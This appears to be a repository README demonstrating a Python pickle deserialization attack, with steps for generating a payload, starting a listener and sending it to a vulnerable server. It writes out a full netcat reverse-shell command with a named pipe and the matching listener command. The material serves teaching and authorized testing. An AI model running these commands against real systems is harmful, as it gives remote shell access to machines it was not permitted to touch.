# Deserialization Attacks

Deserialization attacks exploit vulnerabilities in the way that some programming languages or frameworks handle the deserialization of untrusted data. This can lead to the execution of arbitrary code, bypassing authentication, or other malicious activities.

## Understanding Deserialization Attacks

When an application deserializes data, it converts it back into an object from a byte stream. If the data being deserialized can be controlled by an attacker, they may craft malicious serialized objects to execute code or manipulate the application's behavior.


# Deserialization Attack Demonstration

This repository demonstrates a deserialization attack using Python. The example includes a client script that sends a malicious serialized object to a server, exploiting a vulnerability in deserialization logic.

## Overview

The repository contains the following scripts:
- **client.py**: A script that acts as a malicious client, sending a serialized payload to the server.
- **payload.py**: A script for generating a malicious payload.
- **generate_shell.sh**: A shell script to generate a specific payload for establishing a reverse shell connection.

## Files

### client.py

This script connects to a server and sends a malicious payload designed to exploit a deserialization vulnerability.


### payload.py

This script creates a malicious payload using Python's pickle module. It generates a payload that, when deserialized, executes a system command.

### generate_shell.sh

A shell script to generate a payload for establishing a reverse shell connection.

## Usage

1. **Generating the Payload:**

Use `payload.py` to generate a raw or base64 encoded malicious payload. Before running the command, ensure to replace `<kali ip>` with the IP address of your own machine where you will be listening for incoming connections. The second argument after `<kali ip>` is the port where you will be listening. In this example, the port is set to `1234`.

```bash
python3 payload.py "rm /tmp/shell; mknod /tmp/shell p; nc <kali ip> 1234 0</tmp/shell | /bin/sh 1>/tmp/shell"
```

Replace <kali ip> with your machine's IP address and 1234 with the port number where your nc (netcat) listener will be running.

```bash
python3 payload.py "rm /tmp/shell; mknod /tmp/shell p; nc 192.168.1.10 1234 0</tmp/shell | /bin/sh 1>/tmp/shell"
```

This command will generate a payload that, when executed, removes a temporary shell, creates a named pipe at /tmp/shell, and initiates a reverse shell to the specified IP and port.

2. **Setting Up the Listener:**

On your machine (the attacker machine), start a nc (netcat) listener to wait for the incoming connection:

```bash
nc -lnvp 1234
```

Make sure the port number (1234 in this case) matches the one specified in the payload.


3. **Sending the Payload:**

Run client.py to send the generated payload to the vulnerable server.

```bash
python3 client.py
```

4. **Customization:**

- Update the IP and port in client.py to match your testing environment.
- Customize the command in generate_shell.sh to perform different actions.


### Key Points:

- **`<kali ip>`**: Replace this placeholder with the actual IP address of your own machine where you will be listening for the reverse shell connection.
- **Port (`1234`)**: This is the port where the `nc` listener will be running. Ensure it matches both in the `payload.py` command and the `nc -lnvp` command.

This ensures that when the payload is executed, the reverse shell will connect back to your machine on the specified port, allowing you to gain access to the target system.


### Ethical Considerations

- **Authorized Testing Only**: Ensure you have explicit permission to test any system for deserialization vulnerabilities.
- **Legal Compliance**: Unauthorized testing and exploitation are illegal and unethical.

#### Disclaimer

These scripts and tools are provided for educational purposes only. The authors are not responsible for any misuse or damage caused by these tools. Use these resources responsibly and in compliance with all applicable laws and regulations.
